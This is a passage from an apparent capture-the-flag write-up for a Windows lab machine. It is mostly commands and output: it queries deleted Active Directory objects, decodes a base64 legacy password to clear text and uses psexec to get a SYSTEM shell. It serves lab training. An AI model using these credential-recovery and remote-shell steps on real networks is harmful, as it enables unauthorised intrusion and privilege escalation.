+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+==================================================================================================
+
+
+Now that we have gained access to the arksvc user, lets see what kinds of groups is it in.
+COMMAND AND OUTPUT:
+==================================================================================================
+*Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
+User name                    arksvc
+Full Name                    ArkSvc
+Comment
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/9/2020 4:18:20 PM
+Password expires             Never
+Password changeable          1/9/2020 4:18:20 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/29/2020 9:05:40 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *AD Recycle Bin       *IT
+                             *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+==================================================================================================
+
+The "AD Recycle Bin" is probably the most interesting as that group most likely has the ability to 
+query for deleted items.
+
+We then do a quick google search for "powershell query deleted items" and web pages pops up with a 
+command o query for the most recently deleted items
+
+COMMAND:
+==================================================================================================
+*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -SearchBase "CN=Deleted Objects, DC=cascade, DC=local" -Filter {ObjectClass -eq "user" } -IncludeDeletedObjects -Properties *
+==================================================================================================
+OUTPUT:
+==================================================================================================
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
+                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+CN                              : CASC-WS1
+                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/9/2020 7:30:19 PM
+createTimeStamp                 : 1/9/2020 7:30:19 PM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM}
+instanceType                    : 4
+isCriticalSystemObject          : False
+isDeleted                       : True
+LastKnownParent                 : OU=Computers,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+localPolicyFlags                : 0
+logonCount                      : 0
+Modified                        : 1/28/2020 6:08:35 PM
+modifyTimeStamp                 : 1/28/2020 6:08:35 PM
+msDS-LastKnownRDN               : CASC-WS1
+Name                            : CASC-WS1
+                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : computer
+ObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108
+primaryGroupID                  : 515
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132230718192147073
+sAMAccountName                  : CASC-WS1$
+sDRightsEffective               : 0
+userAccountControl              : 4128
+uSNChanged                      : 245849
+uSNCreated                      : 24603
+whenChanged                     : 1/28/2020 6:08:35 PM
+whenCreated                     : 1/9/2020 7:30:19 PM
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/27/2020 3:23:08 AM
+createTimeStamp                 : 1/27/2020 3:23:08 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+givenName                       : TempAdmin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 1/27/2020 3:24:34 AM
+modifyTimeStamp                 : 1/27/2020 3:24:34 AM
+msDS-LastKnownRDN               : TempAdmin
+Name                            : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+sDRightsEffective               : 0
+userAccountControl              : 66048
+userPrincipalName               : TempAdmin@cascade.local
+uSNChanged                      : 237705
+uSNCreated                      : 237695
+whenChanged                     : 1/27/2020 3:24:34 AM
+whenCreated                     : 1/27/2020 3:23:08 AM
+
+
+==================================================================================================
+
+We again see another case of legacy passwords contining an encoded string that most likely has a 
+clear text password for TempAdmin.
+
+INFO:
+==================================================================================================
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+==================================================================================================
+
+We again use a base64 decoder to get the clear text of the password which gives out the following:
+COMMAND:
+==================================================================================================
+echo -n YmFDVDNyMWFOMDBkbGVz | base64 -d
+==================================================================================================
+OUTPUT:
+==================================================================================================
+baCT3r1aN00dles
+==================================================================================================
+
+Given that the TempAdmin user has been deleted the most likely scenario is that the administrator
+user currently has that as the password. We can try and use psexec and see if we can get an admin
+shell and capture the flag.
+
+COMMAND:
+==================================================================================================
+psexec.py administrator@10.10.10.182
+==================================================================================================
+OUTPUT:
+==================================================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.10.10.182.....
+[*] Found writable share ADMIN$
+[*] Uploading file zJycQWgX.exe
+[*] Opening SVCManager on 10.10.10.182.....
+[*] Creating service OOdY on 10.10.10.182.....
+[*] Starting service OOdY.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>
+==================================================================================================
+
+And indeed we get a system shell and have officially owned the box.
+
